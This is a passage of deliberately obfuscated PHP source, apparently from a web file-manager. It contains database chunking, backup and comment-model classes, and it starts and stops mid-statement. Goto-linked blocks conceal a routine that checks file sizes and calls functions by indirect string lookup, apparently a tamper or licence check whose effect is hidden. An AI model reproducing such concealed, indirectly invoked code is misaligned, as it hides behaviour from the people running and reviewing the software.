$¥‰Íàõ = is_string($—“¹ÓÆÖ) ? $—“¹ÓÆÖ : $¥‰Íàõ; $şèó±ÙÅ = $this->parseWhereLike($şèó±ÙÅ, $¥‰Íàõ, !0, $ºôÕæ¸™); } if (is_numeric($—“¹ÓÆÖ)) { $¡Æ¦ãÑá[$‡°ó‡õ] = $şèó±ÙÅ; $‡°ó‡õ++; } else { $¡Æ¦ãÑá[$—“¹ÓÆÖ] = $şèó±ÙÅ; } } if ($ºôÕæ¸™ && !$üïêè©) { } return $¡Æ¦ãÑá; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($â¢û»‹ = array()) { $ÚĞ¨Ü¯Ç =& $_SERVER[ÏéâËõ‘]; $ÁîŞ“è‚ = self::SQL_WHERE_IN_CHUNK; $ŞŠ°óŸò = $this->optionsValue(); $²‹¡Éöú = $this->findWhereField($ŞŠ°óŸò); if (!$²‹¡Éöú || isset($ŞŠ°óŸò[$ÚĞ¨Ü¯Ç[292]]) || isset($ŞŠ°óŸò[$ÚĞ¨Ü¯Ç[353]])) { return parent::select($â¢û»‹); } $¤ÏãÊí¶ = $ŞŠ°óŸò[$ÚĞ¨Ü¯Ç[275]][$²‹¡Éöú][1]; $¤ÏãÊí¶ = is_array($¤ÏãÊí¶) ? $¤ÏãÊí¶ : array(); $—¥É„Æƒ = null; for ($Ï»ÕÍ›¿ = 0; $Ï»ÕÍ›¿ < count($¤ÏãÊí¶); $Ï»ÕÍ›¿ += $ÁîŞ“è‚) { $Â¸Ô÷² = array_slice($¤ÏãÊí¶, $Ï»ÕÍ›¿, $ÁîŞ“è‚); if (!is_array($Â¸Ô÷²) || count($Â¸Ô÷²) == 0) { break; } $ŞŠ°óŸò[$ÚĞ¨Ü¯Ç[275]][$²‹¡Éöú][1] = $Â¸Ô÷²; $this->optionsValue($ŞŠ°óŸò); $§àËÚô = parent::select($â¢û»‹); if (!$§àËÚô) { continue; } $—¥É„Æƒ = is_array($—¥É„Æƒ) ? $—¥É„Æƒ : array(); $—¥É„Æƒ = array_merge($—¥É„Æƒ, $§àËÚô); } return $—¥É„Æƒ; } public function delete($°ãÁ¹ = array()) { $§Ê‡®Óí =& $_SERVER[ÏéâËõ‘]; $š½ó•®ã = self::SQL_WHERE_IN_CHUNK; $¹ç÷øæ£ = $this->optionsValue(); $û´â“ê = $this->findWhereField($¹ç÷øæ£); if (!$û´â“ê) { return parent::delete($°ãÁ¹); } $š‡µñïâ = 0; $„•ÉœÄÜ = $¹ç÷øæ£[$§Ê‡®Óí[275]][$û´â“ê][1]; $„•ÉœÄÜ = is_array($„•ÉœÄÜ) ? $„•ÉœÄÜ : array(); for ($«ƒìæÃ¹ = 0; $«ƒìæÃ¹ < count($„•ÉœÄÜ); $«ƒìæÃ¹ += $š½ó•®ã) { $Äõóªò» = array_slice($„•ÉœÄÜ, $«ƒìæÃ¹, $š½ó•®ã); if (!is_array($Äõóªò») || count($Äõóªò») == 0) { break; } $¹ç÷øæ£[$§Ê‡®Óí[275]][$û´â“ê][1] = $Äõóªò»; $this->optionsValue($¹ç÷øæ£); $š‡µñïâ += parent::delete($°ãÁ¹); } return $š‡µñïâ; } private function findWhereField($µŒÍµï¿) { $íĞº¾š =& $_SERVER[ÏéâËõ‘]; $ÊœÆ‘Å¡ = self::SQL_WHERE_IN_CHUNK; if (!is_array($µŒÍµï¿) || !is_array($µŒÍµï¿[$íĞº¾š[275]])) { return !1; } foreach ($µŒÍµï¿[$íĞº¾š[275]] as $…Í“ìÑ => $˜í†ú¡È) { if (is_array($˜í†ú¡È) && isset($˜í†ú¡È[0]) && is_string($˜í†ú¡È[0]) && strtolower($˜í†ú¡È[0]) == $íĞº¾š[7] && is_array($˜í†ú¡È[1]) && count($˜í†ú¡È[1]) > $ÊœÆ‘Å¡) { ignore_timeout(); return $…Í“ìÑ; } } return !1; } public function setMasterDB($¢àü‰Õû = true) { think_config($_SERVER[ÏéâËõ‘][395], $¢àü‰Õû); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\117\160\x74\x69\157\x6e"; public $field = array(); public function listData($€ÕÀ²ğã = false, $şî«ü‰¨ = "\155\x6f\x64\151\146\x79\x54\x69\x6d\145", $ÛÂ¹Íƒã = false) { $ßª‰œï‚ = Model($this->modelType)->get(!1, $this->optionType, !0); $ı…šŠó– = array_values($ßª‰œï‚); if ($ı…šŠó– && $ı…šŠó–[0] && !is_array($ı…šŠó–[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ßª‰œï‚ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ßª‰œï‚) { return $€ÕÀ²ğã ? null : array(); } if (!$€ÕÀ²ğã) { $ßª‰œï‚ = array_filter(array_values($ßª‰œï‚)); return array_sort_by($ßª‰œï‚, $şî«ü‰¨, $ÛÂ¹Íƒã); } return $ßª‰œï‚[$_SERVER[ÏéâËõ‘][396] . $€ÕÀ²ğã]; } public function insert($åİş”ÎË) { $ğ“íÅêğ =& $_SERVER[ÏéâËõ‘]; $åİş”ÎË = array_field_key($åİş”ÎË, $this->field); $æÙô†ğˆ = Model($this->modelType)->get($ğ“íÅêğ[397], $this->optionType . $ğ“íÅêğ[398]); $æÙô†ğˆ = $æÙô†ğˆ ? $æÙô†ğˆ : 0; $åİş”ÎË[$ğ“íÅêğ[399]] = ++$æÙô†ğˆ; $åİş”ÎË[$ğ“íÅêğ[200]] = time(); $åİş”ÎË[$ğ“íÅêğ[85]] = time(); Model($this->modelType)->set($ğ“íÅêğ[397], $æÙô†ğˆ, $this->optionType . $ğ“íÅêğ[398]); Model($this->modelType)->set($ğ“íÅêğ[396] . $æÙô†ğˆ, $åİş”ÎË, $this->optionType); return $æÙô†ğˆ; } public function update($©úØë, $üËôø“ó) { $Õ²…–ç =& $_SERVER[ÏéâËõ‘]; $üËôø“ó = array_field_key($üËôø“ó, $this->field); $±ÒŸúÌ = $this->listData($©úØë); if (!$±ÒŸúÌ || !$©úØë) { return !1; } $üËôø“ó = array_merge($±ÒŸúÌ, $üËôø“ó); $üËôø“ó[$Õ²…–ç[85]] = time(); return Model($this->modelType)->set($Õ²…–ç[396] . $©úØë, $üËôø“ó, $this->optionType); } public function remove($í “‚İú) { if (!$í “‚İú) { return !1; } return Model($this->modelType)->remove($_SERVER[ÏéâËõ‘][396] . $í “‚İú, $this->optionType); } public function clear() { $·ÉÚ‹”Ë =& $_SERVER[ÏéâËõ‘]; Model($this->modelType)->remove($·ÉÚ‹”Ë[397], $this->optionType . $·ÉÚ‹”Ë[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Éßæà¸…, $µ„Ğ‡ì) { if (!$µ„Ğ‡ì) { return !1; } $ü”˜ˆ‰ = $this->listData(); $ü”˜ˆ‰ = array_to_keyvalue($ü”˜ˆ‰, $Éßæà¸…); return isset($ü”˜ˆ‰[$µ„Ğ‡ì]) ? $ü”˜ˆ‰[$µ„Ğ‡ì] : !1; } public function findByName($¢ÆÄ¤) { return $this->findByKey($_SERVER[ÏéâËõ‘][32], $¢ÆÄ¤); } protected function resetData($Ò’ÀÁÜœ) { $œ§Îïµ =& $_SERVER[ÏéâËõ‘]; $Ò’ÀÁÜœ = is_array($Ò’ÀÁÜœ) ? $Ò’ÀÁÜœ : array(); $èÔşùÏÜ = array(); for ($‹×Ìşğ› = 0; $‹×Ìşğ› < count($Ò’ÀÁÜœ); $‹×Ìşğ›++) { $èÔşùÏÜ[$œ§Îïµ[396] . $Ò’ÀÁÜœ[$‹×Ìşğ›][$œ§Îïµ[399]]] = $Ò’ÀÁÜœ[$‹×Ìşğ›]; } return Model($this->modelType)->set($èÔşùÏÜ, !1, $this->optionType); } private function getAutoName($ƒ©ªš«) { $á»›×Š = array_to_keyvalue($this->listData(), $_SERVER[ÏéâËõ‘][32]); if (!$á»›×Š || !isset($á»›×Š[$ƒ©ªš«])) { return $ƒ©ªš«; } for ($¿Şºá„ = 1; $¿Şºá„ < count($á»›×Š); $¿Şºá„++) { $™Ùê¿È = $ƒ©ªš« . "\50{$¿Şºá„}\51"; if (!isset($á»›×Š[$™Ùê¿È])) { return $™Ùê¿È; } } return $™Ùê¿È; } } goto A› Óí¢è´; e‘ƒ»çğ…‡: if ($_SERVER[$_SERVER[ÏéâËõ‘][864]] != $_size($_file)) { $_getc = $_SERVER[ÏéâËõ‘][866]; $_getfile = $_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏéâËõ‘][231], $_getfilec); if (count($_getarrs) < $_SERVER[ÏéâËõ‘][620]) { $exit = $_SERVER[ÏéâËõ‘][869]; $exit(); } $_act = $_SERVER[ÏéâËõ‘][870]; $_act($_file); } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x62\141\143\153\x75\x70\114\151\x73\164"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\x73\x74\141\x74\165\163", "\143\157\156\164\145\x6e\x74", "\x6d\141\156\165\141\154", "\162\145\x73\165\x6c\164", "\164\x69\x6d\x65\106\x72\x6f\x6d", "\x74\151\x6d\145\x54\157"); public function config() { $Éôõùş¯ =& $_SERVER[ÏéâËõ‘]; $æ½¹„´Á = Model($Éôõùş¯[772])->get($Éôõùş¯[782]); $æ½¹„´Á = json_decode($æ½¹„´Á, !0); $æ½¹„´Á = is_array($æ½¹„´Á) ? $æ½¹„´Á : array(); if (!isset($æ½¹„´Á[$Éôõùş¯[757]])) { $æ½¹„´Á[$Éôõùş¯[757]] = $Éôõùş¯[88]; } unset($æ½¹„´Á[$Éôõùş¯[1632]]); Action($Éôõùş¯[1859])->taskInit(); Model($Éôõùş¯[1631])->cacheClear(); $ö ‡ = $Éôõùş¯[1860]; $Õ¬í€çˆ = Model($Éôõùş¯[1861])->findByKey($Éôõùş¯[1650], $ö ‡); if (!$Õ¬í€çˆ) { $Õ¬í€çˆ = array(); } if (isset($Õ¬í€çˆ[$Éôõùş¯[203]])) { $Õ¬í€çˆ[$Éôõùş¯[203]] = json_decode($Õ¬í€çˆ[$Éôõùş¯[203]], !0); } if (isset($æ½¹„´Á[$Éôõùş¯[203]])) { $Õ¬í€çˆ[$Éôõùş¯[203]][$Éôõùş¯[1635]] = $æ½¹„´Á[$Éôõùş¯[203]]; unset($æ½¹„´Á[$Éôõùş¯[203]]); } return array_merge($Õ¬í€çˆ, $æ½¹„´Á); } public function listData($ûû«·ßŒ = false, $°èÂ­úÑ = "\x6d\157\x64\x69\x66\171\x54\151\155\145", $ÇŸ„É¶À = false) { return parent::listData($ûû«·ßŒ, $°èÂ­úÑ, !0); } public function lastItem() { $â‡‹âí = $this->listData(); return !empty($â‡‹âí[0]) ? $â‡‹âí[0] : null; } public function kill($¤¦á¨¿š) { $æ÷ª²Á¬ =& $_SERVER[ÏéâËõ‘]; $¬Ÿ™‹¶‘ = $this->listData($¤¦á¨¿š); if (!$¬Ÿ™‹¶‘ || empty($¬Ÿ™‹¶‘[$æ÷ª²Á¬[32]])) { return !0; } Task::kill($æ÷ª²Á¬[781]); Task::kill($æ÷ª²Á¬[802]); Task::kill($æ÷ª²Á¬[811]); $Û¶Â‚–¤ = $¬Ÿ™‹¶‘[$æ÷ª²Á¬[32]]; $šï‚ƒ˜É = TEMP_FILES . $æ÷ª²Á¬[780] . $Û¶Â‚–¤ . $æ÷ª²Á¬[8]; IO::remove($šï‚ƒ˜É, !1); return $this->remove($¤¦á¨¿š); } public function remove($Ô÷ïçÅÜ) { $ÎÎ¾­ÍÏ = $this->listData($Ô÷ïçÅÜ); if (!$ÎÎ¾­ÍÏ) { return !0; } return $this->backupRemove($ÎÎ¾­ÍÏ); } private function backupRemove($ÑŞşÒ‰ş) { parent::remove($ÑŞşÒ‰ş[$_SERVER[ÏéâËõ‘][399]]); $Ö©Ø²Â‹ = $this->backupPath($ÑŞşÒ‰ş); IO::remove($Ö©Ø²Â‹, !1); return !0; } private function backupPath($•Å— Š®) { $ı§ıËİÆ =& $_SERVER[ÏéâËõ‘]; $ÏÖÅõçä = $•Å— Š®[$ı§ıËİÆ[32]]; $³®¯ûŠ = Model($ı§ıËİÆ[772])->get($ı§ıËİÆ[773]); $Äı¯½÷Ş = substr(md5($ı§ıËİÆ[774] . $³®¯ûŠ . $ÏÖÅõçä), 0, 8); return "\x7b\x69\x6f\x3a{$•Å— Š®[$ı§ıËİÆ[754]]}\x7d\57\144\141\164\x61\142\x61\163\x65\x2f\x62\141\x63\153\x75\x70\57" . $ÏÖÅõçä . $ı§ıËİÆ[11] . $Äı¯½÷Ş; } public function start() { $çƒÂÑ œ =& $_SERVER[ÏéâËõ‘]; if ($GLOBALS[$çƒÂÑ œ[6]][$çƒÂÑ œ[89]][$çƒÂÑ œ[1862]] != $çƒÂÑ œ[88]) { return !0; } $˜àğÍî— = $this->config(); if (!$˜àğÍî— || $˜àğÍî—[$çƒÂÑ œ[1632]] != $çƒÂÑ œ[88]) { return !1; } $Óï±³¥ï = $this->process(); foreach ($Óï±³¥ï as $Äè©Ş±) { if ($Äè©Ş±) { return Task::restart($Äè©Ş±[$çƒÂÑ œ[399]]); } } $×Ã àäŸ = new Backup(); $Ï‚Ç½å¹ = $×Ã àäŸ->db(); if ($Ï‚Ç½å¹) { $Ï‚Ç½å¹ = $×Ã àäŸ->dbFile(); if ($Ï‚Ç½å¹ && $˜àğÍî—[$çƒÂÑ œ[757]] == $çƒÂÑ œ[197]) { $Ï‚Ç½å¹ = $×Ã àäŸ->file(); } } Backup::set(array($çƒÂÑ œ[752] => 1, $çƒÂÑ œ[497] => time())); return !0; } public function process() { $÷—Ê¿û¹ =& $_SERVER[ÏéâËõ‘]; $­±“ÖÍ¸ = array($÷—Ê¿û¹[760] => Task::get($÷—Ê¿û¹[781]), $÷—Ê¿û¹[764] => Task::get($÷—Ê¿û¹[802]), $÷—Ê¿û¹[199] => Task::get($÷—Ê¿û¹[811])); $Ò³›¿Ô€ = !1; foreach ($­±“ÖÍ¸ as &$ØÊö®©) { if ($Ò³›¿Ô€) { $ØÊö®© = !1; continue; } if ($ØÊö®©) { $ºÁêˆëù = intval(_get($ØÊö®©, $÷—Ê¿û¹[1667], 0)); if (time() - $ºÁêˆëù > 7200) { Task::kill($ØÊö®©[$÷—Ê¿û¹[399]]); $Ò³›¿Ô€ = !0; $ØÊö®© = !1; } } } return $­±“ÖÍ¸; } public function restore() { $íåº‚˜Æ =& $_SERVER[ÏéâËõ‘]; ActionCall($íåº‚˜Æ[1065], !0, 1); ActionCall($íåº‚˜Æ[1065], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\156\164"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\145" => "\143\x6f\x6d\x6d\145\156\164\137\x6d\145\x74\x61", "\x6d\x65\164\x61\x46\151\x65\x6c\x64" => "\x63\x6f\155\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Óäû÷” ) { $äÒ´¡ßù =& $_SERVER[ÏéâËõ‘]; if ($Óäû÷” [$äÒ´¡ßù[1863]]) { $ÓÆ«ã¿ = $this->where(array($äÒ´¡ßù[1864] => $Óäû÷” [$äÒ´¡ßù[1863]]))->find(); if (!$ÓÆ«ã¿ || $ÓÆ«ã¿[$äÒ´¡ßù[411]] != $Óäû÷” [$äÒ´¡ßù[411]] || $ÓÆ«ã¿[$äÒ´¡ßù[505]] != $Óäû÷” [$äÒ´¡ßù[505]]) { return !1; } $this->where(array($äÒ´¡ßù[1864] => $Óäû÷” [$äÒ´¡ßù[1863]]))->setAdd($äÒ´¡ßù[1865], 1); } $Óäû÷” [$äÒ´¡ßù[1866]] = 0; $Óäû÷” [$äÒ´¡ßù[1865]] = 0; $Óäû÷” [$äÒ´¡ßù[752]] = 1; return $this->add($Óäû÷” ); } public function commentCount($ÊµéÑÈÕ, $°×äßˆ’, $£âôÙç = false) { $ğúû Õ– =& $_SERVER[ÏéâËõ‘]; if (!$ÊµéÑÈÕ) { return array(); } if (is_string($ÊµéÑÈÕ) || is_int($ÊµéÑÈÕ)) { $ÊµéÑÈÕ = array($ÊµéÑÈÕ); } $¾Ûùë§‹ = array($ğúû Õ–[505], $ğúû Õ–[1867] => $ğúû Õ–[500]); $È²ÊË‡ = array($ğúû Õ–[505] => array($ğúû Õ–[7], $ÊµéÑÈÕ), $ğúû Õ–[411] => $°×äßˆ’); if ($£âôÙç) { $È²ÊË‡[$ğúû Õ–[1662]] = $£âôÙç; } $ëÙïåç = $this->field($¾Ûùë§‹)->where($È²ÊË‡)->group($ğúû Õ–[505])->select(); return array_to_keyvalue($ëÙïåç, $ğúû Õ–[505], $ğúû Õ–[500]); } public function starTarget($­èÄùàÖ, $Âì³ÃÕ¿) { $°•¾„ô÷ =& $_SERVER[ÏéâËõ‘]; $ûœ÷Á­¥ = $­èÄùàÖ + self::TYPE_STAR_OFFSET; $Æù¶”©Æ = array($°•¾„ô÷[1662] => USER_ID, $°•¾„ô÷[411] => $ûœ÷Á­¥, $°•¾„ô÷[505] => $Âì³ÃÕ¿); $ãÓÓÇ¸¡ = $this->where($Æù¶”©Æ)->find(); if ($ãÓÓÇ¸¡) { return $this->where(array($°•¾„ô÷[399] => $ãÓÓÇ¸¡[$°•¾„ô÷[399]]))->delete(); } $ÄÆ«Ç¢é = array($°•¾„ô÷[1863] => 0, $°•¾„ô÷[1662] => USER_ID, $°•¾„ô÷[752] => 1, $°•¾„ô÷[757] => $°•¾„ô÷[12], $°•¾„ô÷[411] => $ûœ÷Á­¥, $°•¾„ô÷[505] => $Âì³ÃÕ¿, $°•¾„ô÷[1866] => 0, $°•¾„ô÷[1865] => 0); return $this->add($ÄÆ«Ç¢é); } public function starTargetCount($¿º•€ì, $Ğú¥ğ¢ ) { $İê÷ŠÇÖ =& $_SERVER[ÏéâËõ‘]; $ğ÷²ğ = $Ğú¥ğ¢  + self::TYPE_STAR_OFFSET; $Ò‹½Ê = $this->commentCount($¿º•€ì, $ğ÷²ğ); $Ï¢¨›ü = $this->commentCount($¿º•€ì, $ğ÷²ğ, USER_ID); return array($İê÷ŠÇÖ[1868] => $Ò‹½Ê, $İê÷ŠÇÖ[1869] => $Ï¢¨›ü); } public function starTargetUserList($¨Ï­‘¦, $›±ñÄèÄ) { $İöàåñå =& $_SERVER[ÏéâËõ‘]; $ÅÏ™‹Úã = $¨Ï­‘¦ + self::TYPE_STAR_OFFSET; $ÉËìœ = array($İöàåñå[505] => $›±ñÄèÄ, $İöàåñå[411] => $ÅÏ™‹Úã); $§®ªæ¥ = $this->where($ÉËìœ)->count(); $Óğ˜«í = array($İöàåñå[255] => $§®ªæ¥, $İöàåñå[1870] => array()); if (!$§®ªæ¥) { return $Óğ˜«í; } $ã ¸Ûã = $this->field($İöàåñå[1662])->where($ÉËìœ)->limit(500)->select(); $ã ¸Ûã = array_to_keyvalue($ã ¸Ûã, $İöàåñå[12], $İöàåñå[1662]); $Óğ˜«í[$İöàåñå[1870]] = Model($İöàåñå[513])->userListInfo($ã ¸Ûã); return $Óğ˜«í; } public function prasiseUserList($ÔåÇÚÔ) { $ôŸ…»ƒ¹ =& $_SERVER[ÏéâËõ‘]; $ı‹õÊ… = array($ôŸ…»ƒ¹[1871] => $ÔåÇÚÔ); $å‚¬«»È = $this->where($ı‹õÊ…)->find(); $ØÃ™“òĞ = _get($å‚¬«»È, $ôŸ…»ƒ¹[1866], 0); $˜à“ÍÄÖ = array($ôŸ…»ƒ¹[255] => $ØÃ™“òĞ, $ôŸ…»ƒ¹[1870] => array()); if (!$ØÃ™“òĞ) { return $˜à“ÍÄÖ; } $ŞË‘×§ä = Model($ôŸ…»ƒ¹[1872])->field($ôŸ…»ƒ¹[1662])->where($ı‹õÊ…)->limit(500)->select(); $ŞË‘×§ä = array_to_keyvalue($ŞË‘×§ä, $ôŸ…»ƒ¹[12], $ôŸ…»ƒ¹[1662]); $˜à“ÍÄÖ[$ôŸ…»ƒ¹[1870]] = Model($ôŸ…»ƒ¹[513])->userListInfo($ŞË‘×§ä); return $˜à“ÍÄÖ; } public function remove($€ç§ÌŸË) { $®«Â‰£Ğ =& $_SERVER[ÏéâËõ‘]; $·Î’şß¸ = array($®«Â‰£Ğ[1864] => $€ç§ÌŸË); $æÍÎŠÉœ = $this->where($·Î’şß¸)->find(); if ($æÍÎŠÉœ[$®«Â‰£Ğ[1863]]) { $this->where(array($®«Â‰£Ğ[1864] => $æÍÎŠÉœ[$®«Â‰£Ğ[1863]]))->setAdd($®«Â‰£Ğ[1865], -1); } return $this->where($·Î’şß¸)->delete(); } public function edit($Û´µÔ­, $œ¹…¿±«) { $ÊÑí³»• =& $_SERVER[ÏéâËõ‘]; $€ú×Û‘È = array($ÊÑí³»•[1864] => $Û´µÔ­); return $this->where($€ú×Û‘È)->save(array($ÊÑí³»•[1873] => $œ¹…¿±«)); } public function prasise($çæ©ÑÒ®) { $µğÀÊ™ =& $_SERVER[ÏéâËõ‘]; $ÑĞ“î²é = Model($µğÀÊ™[1874]); $¢€÷§³Ä = array($µğÀÊ™[1864] => $çæ©ÑÒ®, $µğÀÊ™[1653] => USER_ID); $¼ÈÒ¿Ñê = $ÑĞ“î²é->where($¢€÷§³Ä)->find(); if (!$¼ÈÒ¿Ñê) { $ÑĞ“î²é->add($¢€÷§³Ä); $Á¶ŸÑî = $this->where(array($µğÀÊ™[1864] => $çæ©ÑÒ®))->setAdd($µğÀÊ™[1866], 1); } else { $ÑĞ“î²é->where($¢€÷§³Ä)->delete(); $Á¶ŸÑî = $this->where(array($µğÀÊ™[1864] => $çæ©ÑÒ®))->setAdd($µğÀÊ™[1866], -1); } return $Á¶ŸÑî; } public function targetInfo($÷Ïé¸ëÂ, $‘µº‘İ) { $Ú»é€“â =& $_SERVER[ÏéâËõ‘]; $­ıÇ£‡» = array($Ú»é€“â[586] => $÷Ïé¸ëÂ, $Ú»é€“â[587] => $‘µº‘İ); $¦šüÊÚ´ = $this->where($­ıÇ£‡»)->count(); $Æı¨÷ú… = "\122\x49\x47\110\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\155\x65\156\164\137\160\162\141\151\163\145\x20\163\164\x61\x72\x20\157\156\40\x63\x6f\155\155\x65\x6e\164\x2e\x63\157\155\155\x65\x6e\164\111\104\40\x3d\x20\163\164\x61\162\56\x63\x6f\x6d\x6d\145\156\164\111\104"; $¾¶ã˜â± = $this->alias($Ú»é€“â[354])->where($­ıÇ£‡»)->join($Æı¨÷ú…, $Ú»é€“â[1875])->count(); $¨À©®  = array($Ú»é€“â[1876] => $¦šüÊÚ´, $Ú»é€“â[1877] => $¾¶ã˜â±); return $¨À©® ; } public function listData($Øşá ù) { $Ä¹Ä“™½ =& $_SERVER[ÏéâËõ‘]; if (isset($Øşá ù[$Ä¹Ä“™½[1878]])) { if ($Øşá ù[$Ä¹Ä“™½[1878]]) { $Øşá ù[$Ä¹Ä“™½[1871]] = array($Ä¹Ä“™½[1019], intval($Øşá ù[$Ä¹Ä“™½[1878]])); } unset($Øşá ù[$Ä¹Ä“™½[1878]]); } if (isset($Øşá ù[$Ä¹Ä“™½[1879]])) { if ($Øşá ù[$Ä¹Ä“™½[1879]]) { $Øşá ù[$Ä¹Ä“™½[1871]] = array($Ä¹Ä“™½[1016], intval($Øşá ù[$Ä¹Ä“™½[1879]])); } unset($Øşá ù[$Ä¹Ä“™½[1879]]); } return $this->_listData($Øşá ù); } private function _listData($˜Ãü€®) { $…¼Ñ¦©¾ =& $_SERVER[ÏéâËõ‘]; $ÅŠÆÌé‡ = $this->where($˜Ãü€®)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÅŠÆÌé‡[$…¼Ñ¦©¾[369]]); $this->_listAppendUser($ÅŠÆÌé‡[$…¼Ñ¦©¾[369]]); $this->_listAppendMeta($ÅŠÆÌé‡[$…¼Ñ¦©¾[369]]); return $ÅŠÆÌé‡; } private function _makeOrder() { $À´ú˜ı¤ =& $_SERVER[ÏéâËõ‘]; $ÀÃÚüë§ = array($À´ú˜ı¤[1866], $À´ú˜ı¤[1865], $À´ú˜ı¤[200]); $çÖù¾õá = Input::get($À´ú˜ı¤[457], $À´ú˜ı¤[7], $À´ú˜ı¤[423], $ÀÃÚüë§); $ä°òè« = Input::get($À´ú˜ı¤[458], $À´ú˜ı¤[7], $À´ú˜ı¤[1655], array($À´ú˜ı¤[1880], $À´ú˜ı¤[453])); $ßÅ›Ë = $çÖù¾õá . $À´ú˜ı¤[53] . $ä°òè«; return $this->order($ßÅ›Ë); } private function _listAppendParent(&$ÁÉÛ¯«š) { $Ò³ñŠ´Û =& $_SERVER[ÏéâËõ‘]; $…Ÿ™—Îı = array_unique(array_to_keyvalue($ÁÉÛ¯«š, $Ò³ñŠ´Û[12], $Ò³ñŠ´Û[1863])); $…Ÿ™—Îı = array_remove_value($…Ÿ™—Îı, $Ò³ñŠ´Û[197]); if (!$…Ÿ™—Îı) { return; } $¦‰ ÂŠé = $this->where(array($Ò³ñŠ´Û[1864] => array($Ò³ñŠ´Û[7], $…Ÿ™—Îı)))->select(); $¦‰ ÂŠé = array_to_keyvalue($¦‰ ÂŠé, $Ò³ñŠ´Û[1871]); foreach ($ÁÉÛ¯«š as &$°Á¿»Ô) { if (isset($¦‰ ÂŠé[$°Á¿»Ô[$Ò³ñŠ´Û[1863]]])) { $°Á¿»Ô[$Ò³ñŠ´Û[1881]] = $¦‰ ÂŠé[$°Á¿»Ô[$Ò³ñŠ´Û[1863]]]; } } unset($°Á¿»Ô); } private function _listAppendUser(&$¿Í¹ˆüÁ) { $£öûÕÀ =& $_SERVER[ÏéâËõ‘]; $Ìú£Ç® = array_unique(array_to_keyvalue($¿Í¹ˆüÁ, $£öûÕÀ[12], $£öûÕÀ[1662])); $Ìú£Ç® = array_remove_value($Ìú£Ç®, $£öûÕÀ[197]); if (count($Ìú£Ç®) == 0) { return; } foreach ($¿Í¹ˆüÁ as $ØØüãÀ) { if (isset($ØØüãÀ[$£öûÕÀ[1881]])) { $Ìú£Ç®[] = $ØØüãÀ[$£öûÕÀ[1881]][$£öûÕÀ[1662]]; } } $ÃêÓ¯ıÁ = Model($£öûÕÀ[535])->userListInfo($Ìú£Ç®); foreach ($¿Í¹ˆüÁ as &$ØØüãÀ) { $ØØüãÀ[$£öûÕÀ[600]] = $ÃêÓ¯ıÁ[$ØØüãÀ[$£öûÕÀ[1662]]]; if (isset($ØØüãÀ[$£öûÕÀ[1881]])) { $ØØüãÀ[$£öûÕÀ[1881]][$£öûÕÀ[600]] = $ÃêÓ¯ıÁ[$ØØüãÀ[$£öûÕÀ[1881]][$£öûÕÀ[1662]]]; } } unset($ØØüãÀ); } private function _listAppendMeta(&$¹ÌØŸµ‹) { $ˆ¤×¯ßÔ =& $_SERVER[ÏéâËõ‘]; $è‚¢İ¨¥ = array_unique(array_to_keyvalue($¹ÌØŸµ‹, $ˆ¤×¯ßÔ[12], $ˆ¤×¯ßÔ[1871])); $è‚¢İ¨¥ = array_remove_value($è‚¢İ¨¥, $ˆ¤×¯ßÔ[197]); if (!$è‚¢İ¨¥) { return; } foreach ($¹ÌØŸµ‹ as $Øõ„ØÜÔ) { if (isset($Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1881]])) { $è‚¢İ¨¥[] = $Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1881]][$ˆ¤×¯ßÔ[1871]]; } } $Æ‡¼ÏÇ = $this->metaList($è‚¢İ¨¥); if (!$Æ‡¼ÏÇ) { return !1; } foreach ($¹ÌØŸµ‹ as &$Øõ„ØÜÔ) { $Øõ„ØÜÔ[$ˆ¤×¯ßÔ[466]] = $Æ‡¼ÏÇ[$Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1871]]]; if (isset($Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1881]])) { $Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1881]][$ˆ¤×¯ßÔ[466]] = $Æ‡¼ÏÇ[$Øõ„ØÜÔ[$ˆ¤×¯ßÔ[1881]][$ˆ¤×¯ßÔ[1871]]]; } } unset($Øõ„ØÜÔ); } private function metaList($ò¥Ëò­ô) { $å‰±”Ü† =& $_SERVER[ÏéâËõ‘]; if (!$ò¥Ëò­ô) { return array(); } $Ó¡ø›Ÿ· = array($å‰±”Ü†[1871] => array($å‰±”Ü†[7], $ò¥Ëò­ô)); $ù£›È–• = Model($å‰±”Ü†[1882])->where($Ó¡ø›Ÿ·)->select(); $ù£›È–• = array_to_keyvalue_group($ù£›È–•, $å‰±”Ü†[1871]); foreach ($ù£›È–• as $ŒÂ©æÛÄ => $ÀÕ‡ Ò) { $‡øİÈË = array(); foreach ($ÀÕ‡ Ò as $èş“Ï¾) { $‡øİÈË[$èş“Ï¾[$å‰±”Ü†[94]]] = $èş“Ï¾[$å‰±”Ü†[374]]; } $ù£›È–•[$ŒÂ©æÛÄ] = $‡øİÈË; } return $ù£›È–• ? $ù£›È–• : array(); } } goto C”²ñë•«; F‰¤¯Ä±„: if (!isset($_SERVER[$_SERVER[ÏéâËõ‘][864]]) || 